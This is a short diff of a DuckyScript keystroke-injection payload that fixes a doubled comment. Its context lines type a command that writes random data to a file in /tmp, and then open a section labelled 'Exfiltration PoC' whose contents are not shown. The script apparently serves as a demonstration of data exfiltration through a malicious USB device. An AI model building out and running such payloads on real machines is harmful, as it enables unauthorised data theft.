@@ -20,7 +20,7 @@ REM testing on a slow machine modify this value
 DELAY 5000
 GUI LEFT
 
-REM REM Write some random data to a file
+REM Write some random data to a file
 STRINGLN cd /tmp; cat /dev/urandom|base64|head -c 25 > my_data.txt
 
 REM =================== Exfiltration PoC ===================
